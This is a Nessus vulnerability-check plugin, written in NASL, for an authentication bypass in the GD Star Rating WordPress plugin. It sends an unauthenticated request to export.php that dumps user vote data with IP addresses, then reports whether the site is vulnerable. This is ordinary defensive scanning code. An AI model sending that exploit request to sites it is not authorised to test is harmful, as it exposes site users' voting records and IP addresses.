#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(65704);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_bugtraq_id(54666);
  script_osvdb_id(84137);

  script_name(english:"GD Star Rating Plugin for WordPress 'export.php' Authentication Bypass Information Disclosure");
  script_summary(english:"Attempts to export user data.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by an
authentication bypass information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The GD Star Rating Plugin for WordPress installed on the remote host
is affected by a security bypass information disclosure vulnerability.
The issue is triggered when the 'plugins/gd-star-rating/export.php'
script fails to properly verify user authentication, which allows a
remote attacker to access restricted functions and gain access to
potentially sensitive information.");
  # http://ceriksen.com/2012/07/25/wordpress-gd-star-rating-information-disclosure-vulnerability/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?adba423d");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/extend/plugins/flash-album-gallery/changelog/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.9.19 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/07/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/07/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/03/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port,
  exit_if_unknown_ver : TRUE
);

dir = install['path'];
version = install['version'];
install_url = build_url(port:port, qs:dir);

plugin = "GD Star Rating";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "gd-star-rating/js/gdsr.js"][0] =
    make_list('function gdsrWait\\(');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Attempt to run export.php script
url = "/wp-content/plugins/gd-star-rating/export.php?ex=user&ip=on";

res = http_send_recv3(
  method       : "GET",
  item         : dir + url,
  port         : port,
  exit_on_fail : TRUE
);
if (
  egrep(pattern:"post_id, vote, vote_date, ip", string:res[2]) &&
  !egrep(pattern:"Only administrators can use export features.", string:res[2])
)
{
  if (report_verbosity > 0)
  {
    snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report =
      '\nNessus was able to verify the issue exists using the following request :' +
      '\n' +
      '\n' + build_url(port:port, qs:dir + url) +
      '\n';
    if (report_verbosity > 1)
    {
      report +=
        '\n' + 'This produced the following truncated output :' +
        '\n' + snip +
        '\n' + chomp(res[2]) +
        '\n' + snip +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
